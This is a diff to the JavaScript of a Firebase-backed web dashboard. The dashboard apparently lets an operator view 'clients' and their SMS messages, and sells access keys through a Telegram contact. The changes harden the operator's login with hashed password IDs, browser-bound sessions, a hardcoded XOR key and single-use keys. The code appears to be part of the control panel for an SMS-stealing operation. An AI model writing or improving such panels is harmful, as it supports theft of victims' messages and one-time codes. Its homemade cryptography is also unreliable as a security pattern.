@@ -168,15 +168,26 @@ function toggleMute(){
   b.textContent=a.muted?'🔇':'🔊';
 }
 
-function genKey(){window.location.href='https://t.me/8976072495'}
+const TG_ID='8976072495';
+function genKey(){window.open('https://t.me/'+TG_ID,'_blank')}
 
 firebase.initializeApp({databaseURL:'https://yono-ad3-default-rtdb.firebaseio.com'});
 const db=firebase.database();
+const ENC_KEY='owner@2026#protect';
 
-let clientsData={},searchQ='',curDeviceId='',showOnline=false;
-const DEF_PASS='Alexa';
-const TG_ID='8976072495';
+let clientsData={},passwords={},searchQ='',curDeviceId='',showOnline=false,sessionValid=false;
 
+function xorEncrypt(t){const k=ENC_KEY;let r='';for(let i=0;i<t.length;i++)r+=String.fromCharCode(t.charCodeAt(i)^k.charCodeAt(i%k.length));return btoa(r)}
+function xorDecrypt(e){const k=ENC_KEY;let r='',d=atob(e);for(let i=0;i<d.length;i++)r+=String.fromCharCode(d.charCodeAt(i)^k.charCodeAt(i%k.length));return r}
+async function hashPass(p){const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(p));return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('').slice(0,16)}
+function genSession(){let r='';for(let i=0;i<16;i++)r+='0123456789abcdef'[Math.floor(Math.random()*16)];return r}
+function getSession(){return localStorage.getItem('po_session')||''}
+function setSession(s){localStorage.setItem('po_session',s)}
+function checkSession(){
+  const s=getSession();
+  if(!s||!passwords)return false;
+  return Object.values(passwords).some(p=>p.b===s)
+}
 function copyT(t){if(navigator.clipboard){navigator.clipboard.writeText(t).then(()=>showToast('✔ COPIED'))}else showToast(t)}
 function parseTime(t){
   if(!t)return 0;
@@ -203,6 +214,10 @@ function getAllSms(){
 
 // Listeners
 db.ref('clients').on('value',snap=>{clientsData=snap.val()||{};updateUI()});
+db.ref('asia_protection/passwords').on('value',async snap=>{
+  passwords=snap.val()||{};
+  if(await checkSession())doAutoLogin()
+});
 db.ref('.info/connected').on('value',snap=>{if(snap.val()===true)showToast('█ CONNECTED')});
 
 function updateUI(){
@@ -383,30 +398,56 @@ function renderAllSms(){
   document.getElementById('allSmsContent').innerHTML=html;
 }
 
-function doLogin(){
+async function doLogin(){
   const p=document.getElementById('loginPass').value;
   if(!p){document.getElementById('loginErr').textContent='✖ ENTER PASSWORD';return}
-  db.ref('admin/password/password').once('value').then(s=>{
-    const sp=s.val()||DEF_PASS;
-    if(p===sp||p===DEF_PASS){
-      localStorage.setItem('po_pass',p);
-      document.getElementById('logScr').classList.remove('act');
-      document.getElementById('mainScr').classList.add('act');
-      renderDashboard();
-      startMedia();
-      showToast('█ ACCESS GRANTED');
-    }else document.getElementById('loginErr').textContent='✖ ACCESS DENIED'
-  }).catch(()=>{
-    if(p===DEF_PASS){
-      localStorage.setItem('po_pass',DEF_PASS);
-      document.getElementById('logScr').classList.remove('act');
-      document.getElementById('mainScr').classList.add('act');
-      renderDashboard();
-      startMedia();
-      showToast('█ ACCESS GRANTED');
-    }else document.getElementById('loginErr').textContent='✖ ERROR'
-  });
+  const pid=await hashPass(p);
+  const entry=passwords[pid];
+  if(entry&&entry.a==='1'){
+    const bt=getSession();
+    if(entry.b&&entry.b!==bt){document.getElementById('loginErr').textContent='✖ ALREADY USED ON OTHER BROWSER';return}
+    const st=bt||genSession();
+    if(!bt)setSession(st);
+    try{db.ref('asia_protection/passwords/'+pid).update({l:String(Date.now()),b:st})}catch(e){}
+    sessionValid=true;
+    document.getElementById('logScr').classList.remove('act');
+    document.getElementById('mainScr').classList.add('act');
+    renderDashboard();
+    startMedia();
+    showToast('█ ACCESS GRANTED');
+  }else{
+    db.ref('admin/password/password').once('value').then(s=>{
+      const sp=s.val();
+      if(sp&&p===sp){
+        const st=genSession();
+        setSession(st);
+        db.ref('asia_protection/passwords/'+pid).set({a:'1',b:st,l:String(Date.now())}).then(()=>{
+          sessionValid=true;
+          document.getElementById('logScr').classList.remove('act');
+          document.getElementById('mainScr').classList.add('act');
+          renderDashboard();
+          startMedia();
+          showToast('█ PASSWORD ENCRYPTED');
+        });
+      }else document.getElementById('loginErr').textContent='✖ ACCESS DENIED'
+    }).catch(()=>document.getElementById('loginErr').textContent='✖ ERROR')
+  }
 }
+async function doAutoLogin(){
+  if(sessionValid)return;
+  const bt=getSession();
+  if(!bt)return;
+  const found=Object.entries(passwords).find(([k,v])=>v.b===bt);
+  if(found){
+    sessionValid=true;
+    document.getElementById('logScr').classList.remove('act');
+    document.getElementById('mainScr').classList.add('act');
+    renderDashboard();
+    startMedia();
+    showToast('█ SESSION RESTORED');
+  }
+}
+document.getElementById('loginPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
 
 function keyLogin(){
   const k=document.getElementById('keyInput').value.trim();
@@ -415,23 +456,23 @@ function keyLogin(){
   db.ref('panel_keys/'+k).once('value',sn=>{
     const d=sn.val();
     if(d&&d.active===true){
-      localStorage.setItem('po_pass','key_'+k);
+      localStorage.setItem('po_session','key_'+k);
+      sessionValid=true;
       document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
       document.getElementById('mainScr').classList.add('act');
       renderDashboard();
       startMedia();
       showToast('█ KEY ACCEPTED');
-      if(!d.used_by)db.ref('panel_keys/'+k+'/used_by').set('browser');
-    }else document.getElementById('keyErr').textContent='✖ INVALID KEY'
+      db.ref('panel_keys/'+k).update({active:false,used_by:'browser',used_at:Date.now()});
+    }else document.getElementById('keyErr').textContent='✖ INVALID / USED KEY'
   }).catch(()=>document.getElementById('keyErr').textContent='✖ ERROR');
 }
 
-document.addEventListener('DOMContentLoaded',()=>{
-  const p=localStorage.getItem('po_pass');
+document.addEventListener('DOMContentLoaded',async ()=>{
+  const p=getSession();
   if(p&&p.startsWith('key_')){document.getElementById('keyInput').value=p.replace('key_','');keyLogin()}
-  else if(p){document.getElementById('loginPass').value=p;doLogin()}
+  else if(p&&await checkSession()){doAutoLogin()}
 });
-document.getElementById('loginPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
 function showToast(m){
   const t=document.getElementById('toast');t.textContent=m;t.style.opacity='1';
   clearTimeout(t._h);t._h=setTimeout(()=>t.style.opacity='0',2500);
